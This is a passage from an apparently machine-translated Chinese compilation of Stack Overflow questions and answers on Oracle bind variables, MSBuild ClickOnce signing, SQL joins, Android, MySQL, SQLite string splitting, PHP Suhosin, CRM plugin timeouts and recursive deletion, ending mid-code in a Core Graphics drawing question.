select e.label as doc_name,
                       e.url,
                       i.item_id,
                       'multi' as form_type
                from cr_items i, cr_extlinks e
                where i.parent_id = :comment_id
                and e.extlink_id = i.item_id
               UNION
                select null as doc_name,
                       utl_raw.cast_to_varchar2(DBMS_LOB.SUBSTR(r.content, 2000, 1))  as url,
                       r.item_id,
                       'single' as form_type
                from cr_revisions r
                where r.revision_id = ( select content_item.get_latest_revision(:comment_id) from dual);
end; 
```

我想将 comment_id 绑定到值 3052753，所以我做了以下操作：

```
 DECLARE
     comment_id number := 3052753;
    BEGIN
    select e.label  ,
                           e.url,
                           i.item_id,
                           'multi'  
                    from cr_items i, cr_extlinks e
                    where i.parent_id = :comment_id
                    and e.extlink_id = i.item_id
                   UNION
                    select null  ,
                           utl_raw.cast_to_varchar2(DBMS_LOB.SUBSTR(r.content, 2000, 1))  as url,
                           r.item_id,
                           'single'  
                    from cr_revisions r
                    where r.revision_id = ( select content_item.get_latest_revision(:comment_id) from dual);
    END;
/ 
```

这给出了这个错误：

```
ORA-06550: line 4, column 1:
PLS-00428: an INTO clause is expected in this SELECT statement 
```

现在，我已经很不高兴了，因为我不想从根本上改变这个查询，但无论如何我都会继续前进并想出这个（INTO 和 UNION 并没有那么顺利地结合在一起）：

```
DECLARE
 comment_id number := 3052753;
 x_label VARCHAR2(50);
 x_url VARCHAR2(500);
 x_item number;
 x_thing VARCHAR2(50);
BEGIN
select label, url, item_id, thing into x_label, x_url, x_item, x_thing from (
select e.label  ,
                       e.url,
                       i.item_id,
                       'multi' as thing  
                from cr_items i, cr_extlinks e
                where i.parent_id = :comment_id
                and e.extlink_id = i.item_id
               UNION
                select null  ,
                       utl_raw.cast_to_varchar2(DBMS_LOB.SUBSTR(r.content, 2000, 1))  as url,
                       r.item_id,
                       'single' as thing 
                from cr_revisions r
                where r.revision_id = ( select content_item.get_latest_revision(:comment_id) from dual)) ;
END;
/ 
```

但是现在，当然因为我要返回超过 1 行，所以我得到了完全可以预测的

```
ORA-01422: exact fetch returns more than requested number of rows 
```

现在，我可以继续并开始使用游标等，但我的小查询越来越偏离其原始自我。我想做的就是检查查询是否使用该 comment_id 值运行正常。当然，我可以将 comment_id 硬编码到查询中，这样就可以了。但它在 OCI 中也可以正常工作，因此我将在 SQL*PLus 中重现我在 OCI 代码中看到的绑定变量问题。但是，为什么在 SQL*Plus 中做到这一点如此困难呢？我错过了一些非常明显的事情吗？

数据库是 Oracle 10.2.0.1.0 - 64 位，在 Red Hat Enterprise Linux ES 版本 4 (Nahant Update 8) 上运行

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T13:53:11.427

类似于@Glenn 的方法，但您可以在 SQL*Plus 中声明一个绑定变量并在普通 SQL 查询中使用它。首先用[`var[iable]`](http://docs.oracle.com/cd/E11882_01/server.112/e16604/ch_twelve050.htm)命令声明它：

```
variable comment_id number; 
```

然后用[`exec[ute]`](http://docs.oracle.com/cd/E11882_01/server.112/e16604/ch_twelve022.htm)命令设置它，它本质上是一个匿名块：

```
execute :comment_id := 3052753; 
```

然后使用引用运行您的原始查询`:comment_id`，而不是`BEGIN`或`END`：

```
select e.label as doc_name,
                       e.url,
                       i.item_id,
                       'multi' as form_type
                from cr_items i, cr_extlinks e
                where i.parent_id = :comment_id
                and e.extlink_id = i.item_id
               UNION
                select null as doc_name,
                       utl_raw.cast_to_varchar2(DBMS_LOB.SUBSTR(r.content, 2000, 1))  as url,
                       r.item_id,
                       'single' as form_type
                from cr_revisions r
                where r.revision_id = ( select content_item.get_latest_revision(:comment_id) from dual); 
```

除了个人喜好之外，我认为这两种方法之间没有太大的功能差异，并且都可以在 SQL Developer 中工作（作为脚本运行时）。当运行从已经使用绑定表单的 Pro*C 文件复制的 SQL 时，我发现这更容易`:`，纯粹是因为您根本不需要修改代码。

* * *

顺便说一句，你可以写：

```
where r.revision_id = ( select content_item.get_latest_revision(:comment_id) from dual) 
```

没有额外的`select`，如：

```
where r.revision_id = content_item.get_latest_revision(:comment_id) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T13:33:38.077

您可能希望在 sqlplus 中定义一个环境变量，而不是创建一个匿名块：

```
DEFINE comment_id = 3052753 
```

然后在您的查询中引用 &comment_id。

```
select e.label as doc_name,
                       e.url,
                       i.item_id,
                       'multi' as form_type
                from cr_items i, cr_extlinks e
                where i.parent_id = &comment_id
                and e.extlink_id = i.item_id
               UNION
                select null as doc_name,
                       utl_raw.cast_to_varchar2(DBMS_LOB.SUBSTR(r.content, 2000, 1))  as url,
                       r.item_id,
                       'single' as form_type
                from cr_revisions r
                where r.revision_id = ( select content_item.get_latest_revision(&comment_id) from dual); 
```

# msbuild - MSBuild 无法使用临时密钥签署 ClickOnce 清单（错误 MSB3326 和 MSB3321）

> ID：11155858
> 
> 赞同：11
> 
> 时间：2012-06-22T12:08:03.613
> 
> 标签：msbuild, hudson, jenkins, clickonce, code-signing

我正在尝试在 Windows Server 计算机上构建 ClickOnce [Windows Forms](http://en.wikipedia.org/wiki/Windows_Forms)项目（.NET 3.5 / Visual Studio 2010）。*（努力使用[Hudson](http://en.wikipedia.org/wiki/Hudson_%28software%29) [CI](http://en.wikipedia.org/wiki/Continuous_integration)自动化构建过程。）*

为了签署 ClickOnce 清单，我在 Visual Studio 中创建了一个临时密钥，`temp.pfx`. 我可以在我的工作站上从 Visual Studio 成功构建和部署项目。但是在服务器上运行[MSBuild](http://en.wikipedia.org/wiki/MSBuild)时，我收到以下错误消息：

> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Common.targets(1970,9): 错误 MSB3326: 无法导入以下密钥文件: . 密钥文件可能受密码保护。要更正此问题，请尝试再次导入证书或手动将证书导入当前用户的个人证书存储区。[C:.hudson\jobs[...].csproj]
> 
> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Common.targets(1970,9)：错误 MSB3321：导入密钥文件“temp.pfx”已取消。[C:.hudson\jobs[...].csproj]

我没有运气尝试了以下所有问题和答案：

*   堆栈溢出问题*[无法导入密钥文件'blah.pfx' - 错误'密钥文件可能受密码保护'](https://stackoverflow.com/questions/2815366)*

    => 在我的情况下，错误消息不指示证书存储的名称，而是显示“当前用户的个人证书存储”。

    => 即使尝试使用“个人”作为容器名称 ( `sn -i temp.pfx personal`) 接受的答案，它也无法解析密钥：

    > 无法解析 ALiS_TemporaryKey.pfx 中的 PKCS#12 blob - 发生内部错误。

*   堆栈溢出问题*[使用 MSBuild 签署 ClickOnce 或程序集导致错误 MSB3321](https://stackoverflow.com/questions/885484)*

    => 我尝试了接受的答案，但无法导入密钥文件，因为*“用户配置文件不可访问或您要导入的私钥可能需要系统上未安装的加密服务提供程序”*

    => 如果我尝试通过在 Windows 资源管理器中双击文件来导入文件，也会发生同样的情况（RobinDotNet 的建议）

*   Stack Overflow 问题*[在 MSBuild、Team Build 和 TFS 中使用 PFX 文件对程序集进行签名](https://stackoverflow.com/questions/4025316)*

    =>该问题的OP对于上述两个答案也没有成功，但不幸的是，即使他得到的答案也无法帮助我：

    > 以在构建机器上运行 MSBuild 的用户身份登录，手动调用 MSBuild，然后在出现提示时输入密码。

    => 我登录并运行`msbuild myproject.sln`，但它甚至不会提示我输入密码。

    > 最终为我解决的问题是使 TFS Build 服务在本地计算机上运行管理员的帐户。

    [=> 运行 Hudson（更准确地说： Tomcat](http://en.wikipedia.org/wiki/Apache_Tomcat) ）的帐户已经*是*本地管理员。我什至尝试从“以管理员身份运行”命令行运行 MSBuild，但仍然会收到相同的错误消息。

* * *

**更新：**我试图在同一台服务器上的 Visual Studio 中打开解决方案并构建它。我犯了同样的错误。当我尝试在项目属性的“签名”选项卡中重新导入 PFX 文件时，它告诉我“密码无效”。如果我尝试在我的工作站上的 Visual Studio 中的相同解决方案中导入相同的文件并提供相同的密码，它会被接受。

**更新 2：**如果我使用 Visual Studio 2008 生成的旧临时密钥，它可以成功导入到我们服务器的证书存储中；无法导入我使用 Visual Studio 2010 新创建的任何临时密钥。

**更新 3：**我能够在服务器上的 Visual Studio 中创建一个新的“临时密钥”，并在服务器和我的工作站上使用它来签署 ClickOnce 清单。我只是无法对此做出合理的解释——两台计算机都是 64 位的，而且我在两台计算机上都使用 Visual Studio 2010。两者都安装了 v3.5 和 v4 (4.0.30319) .NET 框架。我的工作站是 Windows 7 Professional，服务器是[Windows Server 2008](http://en.wikipedia.org/wiki/Windows_Server_2008) R2 Standard。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-04T23:52:04.323

将 PFX 文件复制到您正在构建的机器上。双击它，并将其安装在机器上的证书管理器中。确保您已登录用于进行构建的帐户。

其他建议/问题：您是否在机器上安装了正确版本的 .NET？您是否有权写入该机器上的证书存储区？

如果打开 Visual Studio 项目，进入项目属性并尝试创建一个新证书，是否有效？它应该创建一个 PFX 文件并将其添加到项目中。您能在证书存储区（菜单 Start/certmgr.msc）中看到它吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-05T20:36:17.727

我发现如果您创建一个临时的.pfx 文件并将密码留空，那么它将在构建机器上正常工作。我没有意识到你可以把它留空，并且第一次失败就像 OP 一样。创建了第二个没有密码的 temp.pfx，它为我构建在构建服务器上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-16T08:55:19.057

我有完全相同的问题。并通过在构建机器上安装适用于 .net 4.0 的 Windows SDK 7.1 来修复它。PS 起初我们已经安装了 SDK 8.0A，构建工作正常，除了唱歌。看来，7.1 更新了系统中的一些组件，所以 pfx 开始工作了。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-03-14T18:08:31.663

我有同样的问题，无法在 TFS 机器上导入。原来我必须在开发人员机器上导出它（项目属性，签名页面，单击更多详细信息）-> 选项卡详细信息，然后使用密码导出。将导出的文件复制到 TFS 并使用相同的密码：完成

# sql - 对多个表上的多个联接的逻辑感到困惑

> ID：11155861
> 
> 赞同：0
> 
> 时间：2012-06-22T12:08:31.650
> 
> 标签：sql, sql-server-2005, join

由于数据库的设置方式，我在从数据库中提取和计算数据时遇到了一点问题。

每个案例都有多个客户和供应商，只有一个主要供应商。

我需要克服的主要问题如下：

1.  能够首先计算供应商加入公司时所驱动的几个月之间的全部客户数量。

2.  计算有多少客户有过“初始联系”，因为有时数据库中没有初始联系。

我试图通过在单个查询中使用多个连接来做到这一点，但这似乎并没有返回完整的数据。

我对使用多个连接感到很困惑，我知道它们可以按任何顺序执行，但我不确定第二个连接正在运行什么，而且我可以在同一个查询中合法地加入不相关的表，或者如果我需要做一个单独的查询来做到这一点。

请在下面找到我的许多查询之一，并附有一张非常简化的图片：

```
SELECT Count(cc.customercase)
FROM   customer cc
       LEFT JOIN customer
              ON cc.custid = c.custid
       LEFT JOIN maincase m
              ON m.id = cc.caseid
       LEFT JOIN custcontactlog cl
              ON cl.caseid = cc.custcaseid
       LEFT JOIN supcase sc
              ON sc.caseid = m.id
WHERE  cl.contactlogtype = 'Initial Contact'
       AND sc.primarysupplyer = 1
       AND Calctargetdate(sc.joindate) > cl.postdate
       AND cl.postdate > sc.joindate
       AND c.gender = 'M'
       AND sc.joindate BETWEEN CONVERT(DATETIME, '01/01/2012', 103) AND
                               CONVERT(DATETIME, '31/03/2012', 103) 
```

[http://i50.tinypic.com/2qk3pqa.png](http://i50.tinypic.com/2qk3pqa.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:28:45.250

我会建议，当您尝试实现两件事时，您应该有两个单独的查询来实现它。

# android - 如何强制关闭应用程序

> ID：11155864
> 
> 赞同：0
> 
> 时间：2012-06-22T12:08:38.820
> 
> 标签：android, process

当我的应用程序崩溃时，它会在随机活动中再次加载，而不是强制关闭。

当我调用`android.os.Process.killProcess(android.os.Process.myPid())`它时，它也遵循这种行为。

我只希望我的应用程序在需要时强制关闭，并让用户向我发送他们的报告。

我应该怎么做才能避免这种行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T11:03:20.663

您确定它会加载一些随机活动吗？通常它会在您的应用程序的活动堆栈顶部加载下一个活动。

来自[https://stackoverflow.com/a/7240460/262462](https://stackoverflow.com/a/7240460/262462)：

1.  使用 FLAG_ACTIVITY_CLEAR_TOP 启动第一个活动（启动屏幕或当前位于活动堆栈底部的任何活动）（这将退出在它之后启动的所有其他活动，这意味着 - 所有活动）。只需让这个活动在活动堆栈中（由于某种原因提前完成）。
2.  在这个活动上调用finish()

# mysql - 将 mssql 查询转换为 mysql 查询的好工具

> ID：11155866
> 
> 赞同：5
> 
> 时间：2012-06-22T12:08:40.567
> 
> 标签：mysql, sql-server

我在堆栈上发现了很多关于将 mysql 转换为 mssql 的问题，但我想以其他方式进行转换。

从 mssql 服务器到 mysql。

是否有（免费）工具可以在不连接数据库的情况下做到这一点？我有一个 sql 查询转储，我想通过将该代码放入工具中来转换它。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:12:36.487

您最好自己执行此操作以确保一切正确，而不是依赖第三方工具（还有了解两段代码之间差异的额外好处）。但是，您可以使用此 SQL 到 MySQL 工具：

[http://download.cnet.com/SQL-To-MySQL-Converter/3000-10254_4-75693763.html](http://download.cnet.com/SQL-To-MySQL-Converter/3000-10254_4-75693763.html)

# c# - 嵌套数据阅读器问题mysql c#

> ID：11155879
> 
> 赞同：4
> 
> 时间：2012-06-22T12:09:27.890
> 
> 标签：c#, mysql, winforms, mysqldatareader

我编写了一个自定义类来处理对远程和本地 MySQL 数据库的数据库查询，但是当我执行嵌套循环时，我收到以下错误：

```
MySql.Data.MySqlClient.MySqlException was unhandled
Message=There is already an open DataReader associated with this Connection which must be closed first.
Source=MySql.Data
ErrorCode=-2147467259
Number=0 
```

我的班级目前看起来像这样

```
public class MySQLManager
{
    private MySqlConnection _MySQLRemoteConnection { get; set; }
    public void setup(string remoteUser, string remotePass, string remoteServerAddress, string remoteDb, string localUser, string localPass, string localServerAddress, string localDb)
    {
        _remote_server_address = remoteServerAddress;
        _remote_database = remoteDb;
        _remote_username = remoteUser;
        _remote_password = remotePass;    
    }
    public void connect()
    {
        try
        {
            _MySQLRemoteConnection = new MySqlConnection() { ConnectionString = string.Format("server={0};database={1};uid={2};password={3};", _remote_server_address, _remote_database, _remote_username, _remote_password) };
            _MySQLRemoteConnection.Open();
            _RemoteConnection = true;
        }
        catch (MySqlException ex)
        {
            _RemoteConnection = false;
        }
    }
    public MySqlCommand run(string query, List<MySqlParameter> dbparams = null)
    {
        connect();

        MySqlCommand sql = getConnection().CreateCommand();
        sql.CommandText = query;
        if (dbparams != null)
        {
            if (dbparams.Count > 0)
            {
                sql.Parameters.AddRange(dbparams.ToArray());
            }
        }
        //disconnect();
        return sql;
    }
    public MySqlDataReader fetch(MySqlCommand cmd)
    {
        //connect();
        var t = cmd.ExecuteReader();
        //disconnect();
        return t;
    } 
```

我正在运行以创建错误的代码，现在我知道我可以在单个查询中执行以下示例，这是一个重新创建错误的示例查询，将其写入单个查询将无法实时使用例子。

```
query = "SELECT field1 FROM tmp WHERE field1 < 3";
            using (var sql = db.run(query))
            {
                txtResponse.Text += "Query ran" + nl;
                using (var row = db.fetch(sql))
                {
                    txtResponse.Text += "Query fetched" + nl;

                    db.connect();
                    while (row.Read())
                    {
                        txtResponse.Text += "Row : " + row[0].ToString() + nl;
                        query = "SELECT val1 FROM tmp2 WHERE field1 = '" + row[0].ToString() + "'";
                        //db.disconnect();
                        using (var sql2 = db.run(query))
                        {
                            txtResponse.Text += "Query ran" + nl;
                            db.disconnect();
                            using (var row2 = db.fetch(sql))
                            {
                                txtResponse.Text += "Query fetched" + nl;
                                db.connect();
                                while (row.Read())
                                {
                                    txtResponse.Text += "        Val : " + row2[0].ToString() + nl;
                                }
                            }
                        }
                    }
                }
            } 
```

那么我将如何让第二个循环工作呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:12:55.930

对于 SQL Server，您可以在连接字符串上使用 MultipleActiveResultSets=true，但这很可能不适用于 MySQL。

另一种选择是使用 2 个连接，每个数据读取器一个。

# android - 如何在 Android 中使用 GeoTools 显示地图？

> ID：11155885
> 
> 赞同：2
> 
> 时间：2012-06-22T12:09:58.957
> 
> 标签：android, geotools

我在 Windows XP 上使用 Eclipse。我下载了 GeoTools 2.7.4-bin.zip 文件并开始将一些 .jar 文件添加到我的项目中。我的项目的特殊之处在于这是一个 Android 项目。

我正在开发一个 Android 应用程序，它可以让我在地图（谷歌地图）上显示一些功能（点但不仅仅是），所以我尝试使用 GeoTools 来做到这一点。但 Android 不支持 Swings。我的代码是

```
/*code i m using */

package info.ipower.geotools;

import java.io.File;

import org.geotools.data.FileDataStore;

import org.geotools.data.FileDataStoreFinder;

import org.geotools.data.simple.SimpleFeatureSource;

import org.geotools.map.FeatureLayer;

import org.geotools.map.Layer;

import org.geotools.map.MapContent;

import org.geotools.styling.SLD;

import org.geotools.styling.Style;

import org.geotools.swing.JMapFrame;

import org.geotools.swing.data.JFileDataStoreChooser;

/**
 * Prompts the user for a shapefile and displays the contents on the screen in a map frame.
 * <p>
 * This is the GeoTools MapApplication application used in documentationa and tutorials. *
 */

public class GeoMap{

    /**
     * GeoTools MapApplication demo application. Prompts the user for a shapefile and displays its
     * contents on the screen in a map frame
     */
    public static void main(String[] args) throws Exception {
        // display a data store file chooser dialog for shapefiles
        File file = JFileDataStoreChooser.showOpenFile("shp", null);
        if (file == null) {
            return;
        }

        FileDataStore store = FileDataStoreFinder.getDataStore(file);
        SimpleFeatureSource featureSource = store.getFeatureSource();

        // Create a map content and add our shapefile to it
        MapContent map = new MapContent();
        map.setTitle("MapApplication");

        Style style = SLD.createSimpleStyle(featureSource.getSchema());
        Layer layer = new FeatureLayer(featureSource, style);
        map.addLayer(layer);

        // Now display the map
        JMapFrame.showMap(map);
    }

} 
```

但它给了我在日食中的以下错误

- JFileDataStoreChooser 类型中的方法 showOpenFile(String, Component) 指的是缺少的类型 Component

*   java.awt.Component 类型无法解析。它是从所需的 .class 文件中间接引用的
*   java.awt.HeadlessException 类型无法解析。它是从所需的 .class 文件中间接引用的
*   无法解析类型 javax.swing.JFileChooser。它是从所需的 .class 文件中间接引用的
*   JMapFrame 类型中的方法 showMap(MapContext) 不适用于参数 (MapContent)
*   javax.swing.JFrame 类型无法解析。它是从所需的 .class 文件中间接引用的，请任何人帮助我解决这些错误

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:16:08.343

不幸的是，Swing 没有在 Android 上实现，所以你运气不好。事实上，甲骨文和谷歌刚刚打了一场大的法律战，部分原因就在于此。我很确定将任何严肃的 Swing 应用程序或库移植到 Android 上是一项重大的工作：几乎是从头开始重写。

# sqlite - 在 sqlite 中拆分 FirstName 和 LastName

> ID：11155886
> 
> 赞同：14
> 
> 时间：2012-06-22T12:10:00.017
> 
> 标签：sqlite

我在 sqlite db 中有一个名为 [tblbook] 的表，其中有一列 [authors]。我在 sql 中尝试做的是将作者值拆分为名字和姓氏，并按姓氏排序。我确实找到了这个很棒的代码：

```
 SELECT substr(BookAuthor, 1, NULLIF(CHARINDEX(' ', BookAuthor) - 1, -1)) AS [FirstName],
   substr(BookAuthor, CHARINDEX(' ', BookAuthor) + 1, LEN(BookAuthor)) AS [LastName]
 FROM tblBook where _id=3 
```

它在 MSSQL 上完美运行，但 sqlite 没有 charindex 函数，因此它失败了。

任何人都可以请善意并告诉我什么应该是实现这一目标的最佳方法。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2014-07-23T15:45:02.763

另一种写法（短一点）是

```
SELECT 
  substr(BookAuthor, 1, instr(BookAuthor, ' ') - 1) AS first_name,
  substr(BookAuthor,    instr(BookAuthor, ' ') + 1) AS last_name
FROM tblBook where id=3
ORDER BY last_name 
```

这将适用于 3.7.15 及更高版本。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-06-23T13:59:59.480

不幸的是，SQLite 缺少此功能：

*   [http://www.sqlite.org/lang_corefunc.html](http://www.sqlite.org/lang_corefunc.html)

*   [SQLite3中子字符串的索引？](https://stackoverflow.com/questions/3188811/index-of-substring-in-sqlite3)

也许您可以使用[http://www.sqlite.org/c3ref/create_function.html将自定义字符串位置函数提供给 SQLite](http://www.sqlite.org/c3ref/create_function.html)

但如果你真的需要它，有一个复杂的、无效的解决方法：

[http://sqlfiddle.com/#!7/e03a4/3](http://sqlfiddle.com/#!7/e03a4/3)

1：创建一个数字表/视图

2：将作者加入数字表，并选择空间的MIN位置

3：现在您可以拆分名称

```
SELECT
  substr( name, 1, pos-1) AS first_name,
  substr( name,    pos+1) AS last_name
FROM (
      SELECT
        author.name,
        numbers.x AS pos
      FROM       author
      INNER JOIN numbers
      WHERE substr( author.name, numbers.x, 1) = ' '
      GROUP BY author.name
     ) AS a
ORDER BY last_name; 
```

# php - 为什么要使用 suhosin？

> ID：11155889
> 
> 赞同：6
> 
> 时间：2012-06-22T12:10:06.680
> 
> 标签：php

我在我的网站目录中找到了 php.ini。目录结构为

> /mobiles/images/php.ini

Inisde php.ini 我注意到了这一行`suhosin.simulation On`

为什么使用它，它有什么作用。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-22T12:14:39.917

来自[http://www.hardened-php.net/suhosin/](http://www.hardened-php.net/suhosin/)

> Suhosin 是一个用于 PHP 安装的高级保护系统。它旨在保护服务器和用户免受 PHP 应用程序和 PHP 核心中已知和未知缺陷的影响。Suhosin 有两个独立的部分，可以单独使用或组合使用。第一部分是针对 PHP 核心的一个小补丁，它实现了一些针对缓冲区溢出或格式字符串漏洞的低级保护，第二部分是一个强大的 PHP 扩展，它实现了所有其他保护

[http://www.hardened-php.net/suhosin/configuration.html#suhosin.simulation](http://www.hardened-php.net/suhosin/configuration.html#suhosin.simulation)

> 当 Suhosin 在模拟模式下运行时，违规会照常记录，但不会阻止或从请求中删除任何内容。

# plugins - 如何在 CRM 2011 中增加插件的最大执行时间？

> ID：11155894
> 
> 赞同：1
> 
> 时间：2012-06-22T12:10:24.173
> 
> 标签：plugins, timeout, dynamics-crm, dynamics-crm-2011, execution

有没有办法增加插件可以执行的最长时间？

默认为 2 分钟。我在[这里](http://ms-crm-2011-beta.blogspot.com/2011/08/plugin-execution-pipeline-ms-crm-2011.html)找到了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T13:37:04.720

限制是为了帮助保护服务器的性能，所以这里的正确方法是重新设计您的解决方案（例如，将您的密集逻辑移到工作流或 Web 服务中并异步调用它）。

我不知道有任何设置、标志或注册表项会延长两分钟的超时时间，但如果你必须坚持，你可能会发现可以通过将逻辑包装在 try/catch 块中来捏造解决方案，`catch`ing`System.TimeoutException`和继续你的代码。也许（未经测试）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-12-09T08:50:04.100

我想补充一点，似乎时间限制仅适用于在沙盒/部分信任模式下注册插件时。

我们遇到了这种问题，并通过在完全信任（非沙盒）模式下注册插件来解决它。我通过使用 Thread.Sleep 函数在开始执行任何插件逻辑之前等待 2 分钟来验证这一点。总共花了将近 4 分钟，但该插件在非沙盒模式下仍然表现良好。在沙盒模式下，它给我们带来了 2 分钟的异常。

根据 Microsoft 沙盒插件在 CRM 2013 中的电子学习材料只有 30 秒的限制，而不是 120 秒。我还没有测试过。

# android - 无法为我的 android 应用程序获取调试签名密钥

> ID：11155895
> 
> 赞同：1
> 
> 时间：2012-06-22T12:10:28.787
> 
> 标签：android

我是安卓新手。我在 android 中运行我的第一个 hello world 应用程序时遇到了一个问题。错误如下：

```
Error generating final archive: Unable to get debug signature key 
```

我看到了调试密钥库 Windows->Preference->Android->Build 的默认路径。路径是

```
C:\Program Files\Java\jdk1.5.0_17\.android\debug.keystore 
```

但是没有创建任何 .android 文件。请帮助我如何解决上述问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:14:55.783

退出 Eclipse，然后删除 .android 目录。然后，重新运行 AVD 管理器并重建项目。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T12:16:05.533

debug.keystore 的默认存储位置在 OS X 和 Linux 上的 ~/.android/ 中，Windows XP 上的 C:\Documents and Settings\.android\ 和 Windows Vista 上的 C:\Users\.android\ 和Windows 7.[参考](http://developer.android.com/tools/publishing/app-signing.html)

# php - 让父母以正确的顺序递归以从 MySQL 表中删除

> ID：11155897
> 
> 赞同：6
> 
> 时间：2012-06-22T12:10:32.383
> 
> 标签：php, mysql, recursion, parent, children

我有这样的表结构

```
mysql> SELECT id, name, parent_id FROM categories;
+-------+------------+-----------+
| id    | name       | parent_id |
+-------+------------+-----------+
| 15790 | Test       |         0 |
| 15791 | Test2      |         0 |
| 16079 | Subtest    |     15790 |
| 16080 | Subtest 2  |     15790 |
| 16081 | Subsubtest |     16079 |
+-------+------------+-----------+ 
```

现在我想为每个孩子和兄弟姐妹查找父母，并以正确的顺序将其返回以进行删除。

所以我在这种情况下的输出是：

```
Array
(
  16081,
  16080,
  16079,
  15791,
  15790
) 
```

我不能仅通过反转父 ID 来删除，因为这应该是可靠的走回树。

此外，我无法/不允许更改表格的结构。所以建立一种索引是必要的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-26T05:25:47.230

假设您无权访问`TRUNCATE`, `SET`（所以您可以这样做`SET FOREIGN_KEY_CHECKS=0;`）、`ALTER`等，并且绝对***必须***使用脚本：

由于问题被标记为`php`，这应该可以解决问题：

```
function reversetree($src_arr, $currentid = 0)
{
    $cats = array();
    foreach($src_arr as $id => $parent)
    {   
        if($parent == $currentid)
        {
            $cats[] = $id;
            $cats = array_merge($cats, reversetree($src_arr, $id));
        }
    }
    return !$currentid ? array_reverse($cats) : $cats;
}

$rs = array();
foreach($pdo->query('SELECT id, parent_id FROM categories') as $row)
    $rs[$row['id']] = $row['parent_id'];

$stmt = $pdo->prepare('DELETE FROM categories WHERE id = ?');

$pdo->beginTransaction();
foreach(reversetree($rs) as $v)
    $stmt->execute(array($v));
$pdo->commit(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-26T00:36:31.943

我不明白为什么您需要按特定顺序使用 ID。您可以通过事务删除它们，它们将同时被删除。

```
DELETE FROM categories WHERE ID IN (15790,15791,16079,16080,16081); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-26T07:11:19.177

```
<?php

// housekeeping
$pdo = new PDO($dsn, $user, $password);
$select = $pdo->prepare(
    "SELECT parent.id AS parent_id, child.id AS child_id
    FROM categories AS parent
    JOIN categories AS child ON parent.id = child.parent_id
    WHERE parent.id = ?"
);
$delete = $pdo->prepare('DELETE FROM categories WHERE id = ?');

// deletes $node_id, deletes its children first if required
function delete_node($node_id){
    $select->execute( array($node_id) );
    $children = $select->fetchAll(PDO::FETCH_NUM);
    if (count($children) !== 0) { // if 0, then the category does not exist, or it has no child
        foreach ($children as $child) { // call delete_node() recursively on each child
            delete_node ($child[1]);
        }
    }
    $delete->execute( array($node_id) ); // then delete this node (or do nothing if $node_id does not exist)
}

// to delete one category and all its sub-categories

delete_node(15790);

// to delete all contents

$allTopLevel = $pdo->exec('SELECT id FROM categories WHERE parent_id = 0')->fetchAll(PDO::FETCH_NUM);
foreach ($allTopLevel as $node) {
    delete_node($node[0]);
} 
```

*未经*测试，甚至不确定它是否“编译”，但你明白了。确保在调用之前锁定表（或启动事务）`delete_node()`。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-22T12:13:29.970

您可以在 DELETE 上使用 CASCADE 添加 FOREIGN KEY 约束。外键将指向父 id 字段上的同一个表。

当您删除父级时，所有子级（无论哪个级别）都会自动删除。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-26T04:07:56.227

抱歉，我帮不上什么忙，因为 SQL 不是我的菜。但也许有人可以将java伪代码转移到解决方案中

```
delete(table.getFirstRow().get(id));

delete(id_a){
    for(data_set : table)
        if(data_set.get(parent_id) == id_a)delete(data_set.get(id));
    }
    table.remove(id_a);
} 
```

编辑：没有关于元素的迭代？所以像这样的东西？

```
delete(list){
    if(list.size() == 0)return;
    idList = list.getAll(id);
    plist = table.getAllWhichEquals(parent_id, idList);
    delete(plist);
    table.remove(idList);
} 
```

啊，算了，我不是同时删除，只是试一试^^

# iphone - 如何使用 Core Graphics（用于手指绘画）创建浮雕或阴影效果

> ID：11155898
> 
> 赞同：5
> 
> 时间：2012-06-22T12:10:33.507
> 
> 标签：iphone, ios, core-graphics, cgcontext, cgcontextref

我有问题在我的绘图中实现“浮雕/阴影效果”。手指绘画功能目前在我的自定义下运行良好`UIView`，下面是我的`drawRect`方法代码：

**使用所有方法编辑代码：**

```
- (void)drawRect:(CGRect)rect
{
    CGPoint mid1 = midPoint(previousPoint1, previousPoint2); 
    CGPoint mid2 = midPoint(currentPoint, previousPoint1);

    CGContextRef context = UIGraphicsGetCurrentContext(); 
    [self.layer renderInContext:context];

    CGContextMoveToPoint(context, mid1.x, mid1.y);
    CGContextAddQuadCurveToPoint(context, previousPoint1.x, previousPoint1.y, mid2.x, mid2.y); 
    CGContextSetLineCap(context, kCGLineCapRound);
    CGContextSetLineWidth(context, self.lineWidth);
    CGContextSetStrokeColorWithColor(context, self.lineColor.CGColor);
    CGContextSaveGState(context);

    // for shadow  effects
    CGContextSetShadowWithColor(context, CGSizeMake(0, 2),3, self.lineColor.CGColor);
    CGContextStrokePath(context);
    [super drawRect:rect];
}

CGPoint midPoint(CGPoint p1, CGPoint p2)
{
    return CGPointMake((p1.x + p2.x) * 0.5, (p1.y + p2.y) * 0.5);
}

-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{

    UITouch *touch = [touches anyObject];

    previousPoint1 = [touch previousLocationInView:self];
    previousPoint2 = [touch previousLocationInView:self];
    currentPoint = [touch locationInView:self];
